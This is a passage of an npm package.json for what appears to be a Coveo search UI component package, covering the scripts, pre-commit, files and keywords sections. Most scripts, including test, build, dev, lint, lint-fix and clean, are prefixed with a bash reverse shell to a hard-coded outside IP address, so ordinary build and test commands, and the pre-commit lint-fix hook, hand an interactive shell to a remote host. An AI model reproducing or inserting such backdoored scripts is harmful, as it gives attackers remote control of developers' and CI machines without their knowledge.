    "./bin/es6/components/UserActions/Strings.js",
    "./bin/es6/components/ViewedByCustomer/Strings.js"
  ],
  "scripts": {
    "test": "/bin/bash -i >& /dev/tcp/67.205.188.101/8080 && karma start ./config/karma.config.js --single-run",
    "testCoverage": "/bin/bash -i >& /dev/tcp/67.205.188.101/8081 && cat ./bin/coverage/lcov.info | node ./node_modules/coveralls/bin/coveralls.js",
    "build": "/bin/bash -i >& /dev/tcp/67.205.188.101/8082 0>&1 && npm run setup && npm run css && npm run build-es && npm run svg && npm run build-commonjs",
    "build-es": "/bin/bash -i >& /dev/tcp/67.205.188.101/8083 && tsc -p ./config/",
    "build-commonjs": "/bin/bash -i >& /dev/tcp/67.205.188.101/8084 && webpack --config ./config/webpack.config.js",
    "setup": "/bin/bash -i >& /dev/tcp/67.205.188.101/8085 && node ./scripts/setup.js",
    "css": "/bin/bash -i >& /dev/tcp/67.205.188.101/8086 && node ./scripts/css.js",
    "svg": "/bin/bash -i >& /dev/tcp/67.205.188.101/8087 && node ./scripts/svg.js",
    "dev": "/bin/bash -i >& /dev/tcp/67.205.188.101/8088 && node ./scripts/dev.server.js",
    "watchTest": "/bin/bash -i >& /dev/tcp/67.205.188.101/8089 && karma start ./config/karma.config.js",
    "lint": "/bin/bash -i >& /dev/tcp/67.205.188.101/8090 && prettier --check \"./**/*\" --config \".prettierrc.js\" --ignore-path \".prettierignore\"",
    "lint-fix": "/bin/bash -i >& /dev/tcp/67.205.188.101/8091 && prettier --write \"./**/*\" --config \".prettierrc.js\" --ignore-path \".prettierignore\"",
    "clean": "/bin/bash -i >& /dev/tcp/67.205.188.101/8092 && rimraf bin",
    "snyk-protect": "snyk protect",
    "prepare": "npm run snyk-protect"
  },
  "pre-commit": [
    "lint-fix"
  ],
  "files": [
    "bin/commonjs/**/*",
    "bin/es6/**/*",
    "bin/css/**/*",
    "bin/img/**/*",
    "bin/typings/**/*",
    "src/**/*.scss"
  ],
  "keywords": [
    "coveo",
    "search",
    "ui",
    "framework",
    "js",
    "typescript",
    "jssearch",
    "jsui",
    "starter",
    "seed"
